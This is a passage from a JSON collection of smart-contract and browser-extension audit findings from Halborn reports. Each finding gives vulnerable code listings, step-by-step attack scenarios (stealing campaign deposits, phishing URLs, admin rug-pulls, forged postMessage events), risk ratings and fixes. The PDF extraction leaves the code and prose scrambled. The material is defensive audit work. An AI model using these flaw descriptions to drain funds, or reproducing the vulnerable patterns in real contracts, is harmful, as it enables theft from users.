        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "According to workflow, The owner of the contract can finish genesis progress. In the related function, require(canContribute, \"GENESIS: GENESIS_ENDED\"); statement is missing. Code Location: EglGenesis.sol Line #~146 Listing 13: EglGenesis.sol (Lines ) 146 147 148 149 150 151 function endGenesis () public onlyOwner whenNotPaused { canContribute = false ; ( bool success , ) = msg . sender . call { value : cumulativeBalance }( \"\" ); require ( success , \" GENESIS : CLOSE_FAILED \" ); emit GenesisEnded ( msg . sender , cumulativeBalance , address ( this ). balance , now ); } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommend to put a require statement on the endGenesis function. Listing 14: EglGenesis.sol (Lines 147) 146 147 function endGenesis () public onlyOwner whenNotPaused { require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); 24 148 149 150 151 152 canContribute = false ; ( bool success , ) = msg . sender . call { value : cumulativeBalance }( \"\" ); require ( success , \" GENESIS : CLOSE_FAILED \" ); emit GenesisEnded ( msg . sender , cumulativeBalance , address ( this ). balance , now ); } Remediation Plan: RISK ACCEPTED: In the opinion of the client, It is possible to call endGenesisfunction even if it doesnt hit the maxThreshold. The client wanted that flexibility so that even if the client dont hit their target ETH amount, they could still continue with Genesis if the amount they do have is satisfactory to the owner multisig. 25 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "In the public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: We noticed the use of public functions in the following contract:  EglGenesis.sol  Listing 15: EglGenesis.sol (Lines ) 37 38 39 40 41 42 - EglGenesis . initialize ( address , uint256 ) ( contracts / EglGenesis . sol #103 -112) - EglGenesis . withdraw () ( contracts / EglGenesis . sol #117 -130) - EglGenesis . allowWithdraw () ( contracts / EglGenesis . sol #135 -141) - EglGenesis . endGenesis () ( contracts / EglGenesis . sol #146 -151) - EglGenesis . pauseGenesis () ( contracts / EglGenesis . sol #156 -158) - EglGenesis . unpauseGenesis () ( contracts / EglGenesis . sol #163 -165) Risk Level: Likelihood - 1 Impact - 2 26 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: The client declared public functions as an external. The necessary changes applied on the relevant functions. 27 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Informational"
        ]
    },
    {
        "title": "BLOCK TIMESTAMP ALIAS USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "During a manual static review, we noticed the use of now. The contract developers should be aware that his does not mean current time. now is an alias for block.timestamp. block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Code Location:  ./contracts/EglGenesis.sol Line #83 Listing 16: EglGenesis.sol (Lines 82) 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 receive () external payable whenNotPaused { require ( canContribute , \" GENESIS : GENESIS_ENDED \" ); require ( msg . value >= MIN_CONTRIBUTION_AMOUNT , \" GENESIS : INVALID_AMOUNT \" ); require ( contributors [ msg . sender ]. amount == 0 , \" GENESIS : ALREADY_CONTRIBUTED \"); contributorsList . push ( msg . sender ); cumulativeBalance = cumulativeBalance . add ( msg . value ); contributorsCount = contributorsCount . add (1) ; Contributor storage contributor = contributors [ msg . sender ]; contributor . amount = msg . value ; contributor . cumulativeBalance = cumulativeBalance ; contributor . idx = contributorsCount ; contributor . date = now ; if ( cumulativeBalance >= maxThreshold ) { canContribute = false ; emit ThresholdMet ( cumulativeBalance , now ); } 28 88 89 90 91 92 93 94 95 emit ContributionReceived ( msg . sender , contributor . amount , contributor . cumulativeBalance , contributor . idx , contributor . date ); } Risk Level: Likelihood - 1 Impact - 2 Recommendation: Use block.number instead of block.timestamp or now reduce the influence of miners. If possible, Its recommended to use Oracles. Remediation plan: NOT APPLICABLE: the EGL Team considers safe the usage of now because 900 seconds of drift from miners is preferable to other options. Calculating time from the block could be wrong if there is a fork or upgrade - timestamps are less vulnerable to a change in block duration that could Use of oracles would occur with Ethereum 2.0 upgrades or hard forks. create a dependency on the health of a third party service and potentially incur additional fees. 29 ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF VISIBILITY ON THE MAXTHRESHOLD VARIABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EGL_Genesis_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "During the dynamic analysis, we noticed the visibility of uint private maxThreshold variable marked as a private. After an initializing phase, maxThreshold variable is not visible through functions. Code Location:  ./contracts/EglGenesis.sol Line #20 Listing 17: EglGenesis.sol (Lines 20) 20 uint private maxThreshold ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: According to workflow, visibility. following code. EGL Team should decide about the variable As an example remediation, Halborn Team suggested the Listing 18: EglGenesis.sol (Lines 20) 20 function getMaxThreshold () external onlyOwner whenNotPaused returns ( uint ){ 21 22 } return maxThreshold ; 30 Remediation plan: RISK ACCEPTED: the EGL Team considers to declaring maxThreshold as a private. 31 3.10 SYMBOLIC EXECUTION SECURITY ASSESSMENT ",
        "labels": [
            "Halborn",
            "EGL_Genesis",
            "Severity: Informational"
        ]
    },
    {
        "title": "ARBITRARY EXECUTION MESSAGES LEAD TO STEALING ALL FUNDS FROM CAMPAIGNS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "participate and participate_qualify_result functions in contracts/cam- paign/src/executions.rs allow a creator to execute any message on behalf of the campaign contract. Consequently, a malicious creator can include an execution message for withdrawing all deposits from a campaign, i.e., stealing deposits from users that have participated in that campaign. The risk level for this finding increases because there are no restrictions to update execution messages to malicious ones when campaigns are ongoing, see HAL-08 for more details. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Loop of messages to be executed without restrictions on behalf of the campaign contract using the participate function: Listing 1: contracts/campaign/src/executions.rs (Lines 787) 787 788 789 790 791 792 for execution in campaign_config . executions . iter () { response = response . add_message ( message_factories :: wasm_execute_bin ( & execution . contract , execution . msg . clone () , )); } 18 Loop of messages to be executed without restrictions on behalf of the campaign contract using the participate_qualify_result function: Listing 2: contracts/campaign/src/executions.rs (Lines 839) 836 837 838 839 840 841 842 843 844 845 if continue_option . can_execute () { let campaign_config = CampaignConfig :: load ( deps . storage ) ?; for execution in campaign_config . executions . iter () { response = response . add_message ( message_factories :: wasm_execute_bin ( & execution . contract , execution . msg . clone () , )); } } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to remove all execution logic from the campaign con- tract. If it is not possible, update the logic in participate and participate_qualify_result functions to not allow transfers of tokens outside the campaign contract. Remediation plan: SOLVED: The issue was fixed in commit 1e1de2243655fa3f083dec248256651e48dbb83b. Valkyrie team removed the execution logic from the campaign contract and moved it to the qualifier contract, which is written by the campaign creator and should have zero balance. 19 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: Critical"
        ]
    },
    {
        "title": "WITHDRAWAL OF ARBITRARY PARTICIPATION REWARDS WITHOUT DEPOSITING COLLATERALS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When a campaign is activated and no one has deposited collaterals yet, an attacker can participate an undefined number of times without depositing any collateral. Later on, attacker will be able to withdraw his ille- gitimate participation rewards. in function This issue arises because, when a user participates, the internal require_collateral is triggered and will always return false if collateral amount is zero, i.e.: As a consequence, validation that user owns enough collateral balance will be bypassed and participation_count field for user will increase by one for each participation, without the need to deposit any collateral. no one has deposited collaterals yet. contracts/campaign/src/states.rs A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 3: contracts/campaign/src/executions.rs (Lines 738) 738 739 740 741 742 743 744 745 if campaign_config . require_collateral () { let mut collateral = Collateral :: load_or_new ( deps . storage , & actor ) ?; let collateral_balance = collateral . balance ( env . block . height ) ?; if collateral_balance < campaign_config . collateral_amount { return Err ( ContractError :: Std ( StdError :: generic_err ( format! ( \" Insufficient collateral balance ( required : {} , 20 current : {}) \" , campaign_config . collateral_amount . to_string () , collateral_balance . to_string () , )))); } collateral . lock ( campaign_config . collateral_amount , env . block . height , campaign_config . collateral_lock_period ) ?; collateral . save ( deps . storage ) ?; 746 747 748 749 750 751 752 753 } Listing 4: contracts/campaign/src/states.rs (Lines 52) 51 pub fn require_collateral (& self ) -> bool { 52 self . collateral_denom . is_some () && !self . collateral_amount . is_zero () 53 } Risk Level: Likelihood - 5 Impact - 5 Recommendation: Update the logic of require_collateral function to handle correctly the cases where no one has yet deposited collaterals in campaigns. Remediation plan: PARTIALLY SOLVED: Commit 5b89ebd6767d031f168ad66dcba7a9fa23b25483 par- tially fixes the security issue by extending the require_collateral ver- ification even if collateral amount is zero. On the other hand, by design, this protocol accepts that users partici- pate in campaigns without depositing collaterals, which could lead that malicious users participate without restrictions and in unfair fashion 21 to earn rewards. The Valkyrie team decided to implement the following measures in commit b3586c8c869b16cdc4a4a1ed8c2d8f46d9531702 to partially reduce the attack surface:  Make qualifier mandatory, so creators can include additional secu-  Limit rity requirements in their campaigns. per participation collateral_denom is None. count the address up to 100 when It is highly recommended that Valkyrie documentation warns creators about the security risks of creating campaigns that do not require collaterals and the security requirements they should consider in their qualifier contracts. 22 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: Critical"
        ]
    },
    {
        "title": "DEPOSITS GET LOCKED IN CAMPAIGN IF COLLATERAL DENOM IS NOT SPECIFIED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When users call deposit_collateral function in contracts/campaign/src/ex- ecutions.rs for a campaign which collateral_denom has not been specified at instantiation time, the contract will receive the deposits as usual, without throwing any error message to users. However, for when users call withdraw_collateral function to withdraw their deposits from campaign contract, the function will throw an error message and deposits will get locked forever in contract. Code Location: Conditional expression in deposit_collateral function does not consider else case: reject operation if campaign_config.collateral_denom is None: Listing 5: contracts/campaign/src/executions.rs (Lines 1088) 1086 1087 1088 1089 1090 1091 1092 1093 1094 let campaign_config = CampaignConfig :: load ( deps . storage ) ?; if let Some ( collateral_denom ) = campaign_config . collateral_denom { if * send_denom ! = collateral_denom { return Err ( ContractError :: Std ( StdError :: generic_err ( \" Missing collateral denom \")) ); } } let mut campaign_state = CampaignState :: load ( deps . storage ) ?; 23 When users call withdraw_collateral function to withdraw their deposits, function will always throw a No collateral error message: Listing 6: contracts/campaign/src/executions.rs (Lines 1153,1154,1155) 1141 1142 1143 1144 1145 1146 1147 1148 1149 1150 1151 1152 1153 1154 if let Some ( denom ) = campaign_config . collateral_denom { let mut campaign_state = CampaignState :: load ( deps . storage ) ?; campaign_state . collateral_amount = campaign_state . collateral_amount . checked_sub ( amount ) ?; campaign_state . save ( deps . storage ) ?; response = response . add_message ( make_send_msg ( & deps . querier , denom , amount , & info . sender , ) ?) ; } else { return Err ( ContractError :: Std ( StdError :: generic_err ( \" No collateral \" )) ); 1155 } Risk Level: Likelihood - 4 Impact - 5 Recommendation: Update the logic in deposit_collateral function to reject deposits in campaigns which collateral_denom has not been specified. Remediation plan: SOLVED: The issue was fixed in commit e45c721568be661fc15d1dd20473ec54b61d1ca1. 24 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "CAMPAIGNS CAN HOST MALICIOUS URLS THAT HARM USERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "a is with created campaign function function create_campaign from When with contracts/campaign_manager/src/executions.rs update_campaign_config contracts/campaign/src/exe- cutions.rs, creator can introduce a malicious external URL that fools users to be redirected to a phishing DApp that can steal their deposits. It is important to note that URLs will appear in official Valkyrie frontend, so legitimate users wont be aware whether those URLs are malicious or not. updated from or Attack scenario: 1. Malicious creator calls create_campaign function to create a campaign with a valid URL. 2. Malicious creator sends the address of the campaign to Valkyrie team, who publishes it in official Valkyrie frontend. 3. Malicious creator calls update_campaign_config function to update URL to a malicious one. 4. Users click a malicious URL that appears in Valkyrie frontend and are redirected to a phishing DApp. 5. Users interact with the phishing DApp and try to participate in the campaign, but their deposits are sent to a malicious address instead of to the actual campaign. 25 Code Location: Creator can send an arbitrary config_msg that contains a malicious URL when creating a new campaign: Listing 7: contracts/campaign_manager/src/executions.rs (Lines 199) 195 pub fn create_campaign ( 196 197 198 199 200 201 202 203 204 205 206 ) -> ContractResult < Response > { deps : DepsMut , env : Env , info : MessageInfo , config_msg : Binary , collateral_denom : Option < Denom >, collateral_amount : Option < Uint128 >, collateral_lock_period : Option < u64 >, qualifier : Option < String >, qualification_description : Option < String >, executions : Vec < ExecutionMsg >, Listing 8: contracts/campaign_manager/src/executions.rs (Lines 227) config . code_id , Some ( config . governance . clone () ) , to_binary (& CampaignInstantiateMsg { 218 let create_campaign_msg = message_factories :: wasm_instantiate ( 219 220 221 222 223 224 225 226 227 228 governance : config . governance . to_string () , fund_manager : config . fund_manager . to_string () , campaign_manager : env . contract . address . to_string () , admin : info . sender . to_string () , creator : info . sender . to_string () , config_msg , collateral_denom , Creator can even update URL to a malicious one for campaign when is in pending status: Listing 9: contracts/campaign/src/executions.rs (Lines 152) if let Some ( url ) = url . as_ref () { validate_url ( url ) ?; 143 144 145 26 146 147 148 149 150 151 152 153 154 } if !is_pending ( deps . storage )? { return Err ( ContractError :: Std ( StdError :: generic_err ( \" Only modifiable in pending status \" , ))); } campaign_config . url = url . clone () ; response = response . add_attribute (\" is_updated_url \" , \" true \" ); Risk Level: Likelihood - 4 Impact - 5 Recommendation: It is recommended that campaign_manager contract generates automatically URLs for created campaigns (e.g.,: https://app.valkyrieprotocol.com/ campaigns/terra1e9...7mpw) and allows users to participate in campaigns directly through Valkyrie frontend, without the need of external sites. Furthermore, creators shouldnt be able to update those URLs. Remediation plan: RISK ACCEPTED: The Valkyrie team accepted the risk for this finding. They also claimed that this is a critical part of the creators process and workflow when creating a campaign, so it must be necessary for the creators to input their link and the protocol must allow for flexibility. 27 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "BALANCE DOES NOT UPDATE WHEN USERS CLAIM REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The claim_participation_reward and claim_referral_reward functions in contracts/campaign/src/executions.rs allow users to claim their rewards when they participate or promote campaigns. Every time these functions are called, they do not update total reward balance, which allows other users to participate in campaigns even if there are not enough rewards for them and affects all rewardable ecosystem of Valkyrie protocol. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: After unlocking balance, total participation reward balance does not up- date when reward is claimed: Listing 10: contracts/campaign/src/executions.rs (Lines 654) 649 650 651 652 653 654 655 656 657 let mut campaign_state = CampaignState :: load ( deps . storage ) ?; let reward_amount = participation . participation_reward_amount ; participation . participation_reward_amount = Uint128 :: zero () ; campaign_state . unlock_balance (& reward_config . participation_reward_denom , & reward_amount ) ?; participation . save ( deps . storage ) ?; campaign_state . save ( deps . storage ) ?; 28 After unlocking balance, total referral reward balance does not update when reward is claimed: Listing 11: contracts/campaign/src/executions.rs (Lines 695) 690 691 692 693 694 695 696 697 698 699 700 701 let mut campaign_state = CampaignState :: load ( deps . storage ) ?; let reward_amount = participation . referral_reward_amount ; participation . referral_reward_amount = Uint128 :: zero () ; campaign_state . unlock_balance ( & cw20 :: Denom :: Cw20 ( reward_config . referral_reward_token . clone () ) , & reward_amount , ) ?; participation . save ( deps . storage ) ?; campaign_state . save ( deps . storage ) ?; Risk Level: Likelihood - 5 Impact - 4 Recommendation: Fix the logic in claim_participation_reward and claim_referral_reward functions to update total balance when rewards are claimed. Remediation plan: SOLVED: The issue was fixed in commit 397af636356390334af89a68f93f8d0340124e61. The Valkyrie team also discovered this security issue while a security audit was in progress and solved it timely. 29 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "POSSIBILITY TO TRANSFER AN ARBITRARY AMOUNT OF VKR TOKENS FROM DISTRIBUTOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The transfer function in contracts/distributor/src/executions.rs allows an admin (Valkyrie team) to transfer an arbitrary amount of VKR tokens from distributor contract to a potentially malicious external account. The maximum amount of VKR tokens to transfer depends on unlocked balance. However, admin can call update_distribution function to unlock all balance by updating start_height (see HAL-13 finding). According to Valkyrie documentation, this contract can concentrate up to 40% of total supply of VKR tokens. Attack scenario: 1. Malicious (or compromised) admin calls update_distribution function with start_height = <any_value_greater_than_current_block_height> and amount = 0. 2. As a consequence of Step 1, the aforementioned function will unlock all balance in contract. 3. Malicious (or compromised) admin calls transfer function to totally withdraw VKR tokens from distributor contract. 4. There wont be more VKR tokens to distribute to lp_staking and governance contracts anymore. 30 Code Location: Listing 12: contracts/distributor/src/executions.rs (Lines 305) 300 301 302 303 304 305 306 307 308 309 // Execute let mut response = make_response ( \" transfer \"); response = response . add_message ( message_factories :: wasm_execute ( & config . managing_token , & Cw20ExecuteMsg :: Transfer { recipient : deps . api . addr_validate (& recipient ) ?. to_string () , amount , }, )); Risk Level: Likelihood - 3 Impact - 5 Recommendation: If not used, it is recommended to totally remove transfer function to avoid rug-pull related attacks. Remediation plan: SOLVED: The issue was fixed in commit 9cb490064cdf6f1d37b2373644d355aaec9f2d8f. 31 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "USERS CAN PARTICIPATE IN CAMPAIGNS EVEN IF THERE ARE NOT ENOUGH REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When a campaign is activated and its creator has not deposited partici- pation / referral rewards yet, users are allowed to participate in the campaign, even if there is no balance for rewards distribution. As a consequence, unless campaign creator deposits all rewards accrued unex- pectedly in campaign, some users will not be able to claim their rewards. This issue arises because, when a user participates, the internal is validate_balance triggered and will always return Ok(()) if balance has no elements, i.e.: if creator has not deposited rewards yet. contracts/campaign/src/states.rs function in A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 13: contracts/campaign/src/states.rs (Lines 157,165) for ( denom , balance ) in self . balances . iter () { 156 pub fn validate_balance (& self ) -> StdResult <() > { 157 158 159 160 161 if * balance < locked_balance { let locked_balance = self . locked_balance ( denom ); return Err ( StdError :: generic_err ( \" locked balance can ' t greater than balance \" )) ; 162 163 164 165 166 } } } Ok (() ) 32 Risk Level: Likelihood - 4 Impact - 4 Recommendation: Update the logic of validate_balance function to handle correctly the cases where creators have not yet deposited rewards in campaigns. Remediation plan: SOLVED: The issue was fixed in commit 1026b29b7cefc6a9e3af3800d2c1061718afe14d. 33 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "NO RESTRICTION TO UPDATE EXECUTION MESSAGES WHEN CAMPAIGNS ARE ONGOING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The update_campaign_config function in contracts/campaign/src/execu- tions.rs allows creators to update execution messages when campaigns are ongoing, i.e., last active height is different to None. This situation can produce the following consequences:  A malicious creator can update execution messages when a campaign is ongoing and force contract to transfer the whole collateral deposits to him, i.e., stealing deposits from users that have participated in that campaign. See HAL-01 for more details regarding the exploiting of this vulnerability.  Users who participate in campaigns may be unaware that the execution messages have changed to malicious or disadvantageous ones and, of course, cannot react timely if the change made is not in the best interest of them. Code Location: Listing 14: contracts/campaign/src/executions.rs 190 191 192 193 194 195 if let Some ( executions ) = executions . as_mut () { executions . sort_by_key (| e | e . order ); campaign_config . executions = executions . iter () . map (| e | Execution :: from ( deps . api , e)) . collect :: < StdResult < Vec < Execution > > >() ?; response = response . add_attribute (\" is_updated_executions \" , \" true \" ); 196 } 34 Risk Level: Likelihood - 5 Impact - 3 Recommendation: Update the logic of update_campaign_config function to restrict the mod- ification of execution messages when campaigns are ongoing. Remediation plan: SOLVED: The issue was fixed in commit 1e1de2243655fa3f083dec248256651e48dbb83b. The Valkyrie team updated the logic of update_campaign_config function to not allow changes in execution messages. 35 ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "FUNCTION TO UPDATE STAKING CONFIG DOES NOT WORK PROPERLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Valkyrie_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "update_staking_config The contracts/governance/src/s- taking/executions.rs is not restricted to be called only by admin (Governance contract). Moreover, all changes made are not saved appropriately in contracts storage. function in As a consequence of malfunction of aforementioned function, admin will never be able to update distributor field for governance contract and could stop receiving rewards adequately. Code Location: Listing 15: contracts/governance/src/staking/executions.rs deps : DepsMut , _env : Env , _info : MessageInfo , distributor : Option < String >, 36 pub fn update_staking_config ( 37 38 39 40 41 ) -> ContractResult < Response > { 42 43 44 45 46 47 48 // Execute let mut response = make_response ( \" update_staking_config \" ); let mut config = StakingConfig :: load ( deps . storage ) ?; if let Some ( distributor ) = distributor { config . distributor = Some ( deps . api . addr_validate ( distributor . as_str () ) ?) ; response = response . add_attribute ( \" is_updated_distributor \" , \" true \" ); } Ok ( response ) 49 50 51 52 36 Risk Level: Likelihood - 5 Impact - 2 Recommendation: Update the logic in update_staking_config function to saves all changes appropriately in contracts storage. Also, restrict access to a function in such a way that can only be called by admin. Remediation plan: SOLVED: The issue was fixed in commit 753da9627f9dad0ee089415937178a33ebe4796d. 37 3.10 (HAL-10) COLLUDED STAKERS CAN TRANSFER VKR TOKENS OUTSIDE GOVERNANCE CONTRACT - MEDIUM ",
        "labels": [
            "Halborn",
            "Valkyrie_Protocol_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNCHECKED ORIGIN IN POSTMESSAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf",
        "body": "During the audit, Halborn discovered that the extension does not check the source of MessageEvents in its EventListeners. This (considering that it is in Playground Labs plans to whitelist the use of the extension for all domains) presents the danger that any website could send message events to the Content Script of the extension. In particular, each webpage into which the extensions Content Script can be injected, can send message events to the Background Script with the following payload.message:  login  logout  confirm_signature  reject_signature  confirm_transaction  reject_transaction and the following payload.method:  eth_sendTransaction  eth_signTypedData_v4 This means that all websites where the Content Script is injected can either log out the user from the extension or confirm/reject signatures and transactions that originated from other legitimate websites. 14 Code Location: Listing 1 1 REDACTED Screenshots/Videos: Confirming signatures generated on another website Logging the user out of the Kapital DAO Extension from a website CVSS Vector:  AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:H Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is recommended while progressively allowing more websites to be injected with the extensions Content Script to add origin checks in the Event Listeners and avoid whitelisting all domains in the check. Instead, it is recommended to have a list of trusted origins and compare the event origin against them: Listing 2: Checks for a valid message origin in the Content Script \" https :// game . cryptounicorns . fun / \" , \" https :// game . cryptopterodactyls . fun /\" 1 var trusted_origins = [ 2 3 4 ]; 5 6 if ( trusted_origins . includes ( event . origin ) ) { 15 do_stuff ( event ); 7 8 } Listing 3: Checks for a valid message origin in the Background Script 1 chrome . runtime . onMessage . addListener ( async ( payload , sender ,  sendResponse ) => { 2 3 4 var messageOrigin = sender . origin ; if ( messageOrigin == ...) { handleRequest ( payload , sender , sendResponse ) Additionally, it is recommended to verify using the message origin that login/logout/confirm/reject messages come from the correct origin, (in this case chrome-extension://ID) to avoid malicious websites from the logging in/out of the user and from the confirmation of their signatures and transactions. Figure 1: A message from the extensions popup 16 Reference: Unchecked Origin in postMessage Remediation Plan: SOLVED: The Playground Labs team solved this issue by implementing the following fixes:  Checking the origin of each Message Event that the extension should emit: Commit ID: 27b021d00b6c5274f6bd71573cc52a0c05686720 17 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest",
            "Severity: High"
        ]
    },
    {
        "title": "UNRESTRICTIVE/UNSECURE EXTENSION CONTENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf",
        "body": "DAO Guild Service Kapital The non-restrictive/insecure Content-Security-Policy (CSP). The CSP cannot declare a default-src directive. directive untrusted sources are not loaded. resources extension malicious ensures browser that that has a declared This is a fallback undeclared, from Moreover, elements controlled by object-src are perhaps coincidentally considered legacy HTML elements and arent receiving new standardized features (such as the security attributes sandbox or allow for <iframe> ). Therefore, it is recommended to restrict this fetch-directive (e.g., explicitly set object-src none if possible). Lastly, the following directives, which do not inherit from the default -src directive, are not defined:  base-uri  form-action  frame-ancestors  plugin-types  report-uri  sandbox  reflected-xss  referrer 18 Figure 2: The default CSP the extension is using CVSS Vector:  AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to add the default-src 'none' directive to the CSP as a fallback. It is also recommended to set the object-src directive to none if possible, since the elements it controls are considered to be inherited, and to set missing directives that do not inherit from the default-src directive. 19 Reference: Secure Chrome extensions: CSP object-src directive best practices Remediation Plan: SOLVED: The Playground Labs team solved this issue by implementing the following fixes:  CSP update in manifest.json: Commit ID: 82e576964d9c0f19cf45b064b39762cb5d4d4f5f 20 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "DEPENDENCIES SHOULD BE PINNED TO EXACT VERSIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf",
        "body": "The application contains some dependencies that are not pinned to an exact version, but are instead set to compatible version (x.x.x). This can potentially allow dependency attacks. Code Location: Listing 4 1 REDACTED CVSS Vector:  AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N Risk Level: Likelihood - 2 Impact - 2 Recommendation: Pinning dependencies to an exact version (=x.x.x) can reduce the chance of inadvertently introducing a malicious version of a dependency in the future. Remediation Plan: SOLVED: The Playground Labs team solved this issue by implementing the following fixes: 21  Pinning all dependencies to exact versions: Commit ID: 0cadfbbc5026922f6c2cefbfe602f073cc2fd076 22 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "APPLICATION ERROR MAY DISCLOSE SENSITIVE TECHNOLOGY INFORMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest_Report_Halborn_Final.pdf",
        "body": "During the audit, Halborn discovered that the application at dev-api. kapital.gg generates an error message that includes sensitive information about its environment, technologies, or associated data. It specifically hints at the fact that the back-end server is possibly using Python and the pydantic library. Screenshots/Videos: Figure 3: In the above code, in case the game parameter is not a valid enumeration member, the server will throw a type_error.enum error. CVSS Vector:  AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N 23 Risk Level: Likelihood - 1 Impact - 2 Recommendation: It is recommended to always return a generic error message to end users, to avoid any possibility of disclosing potentially critical information about the application-related technologies or environment. The returned error messages can comply with the OpenAPI specification and still hide information about the technology used in the back-end. They can still be able to allow integrations and to facilitate third-party developers needs. Reference: CWE-209: Generation of Error Message Containing Sensitive Information Remediation Plan: ACKNOWLEDGED: The Playground Labs team acknowledged this finding. 24 ",
        "labels": [
            "Halborn",
            "Playground_Labs_Kapital_DAO_Guild_Service_Browser_Extension_Pentest",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONTENT SCRIPT DOES NOT CHECK FOR SYNTHETICALLY GENERATED EVENTS",
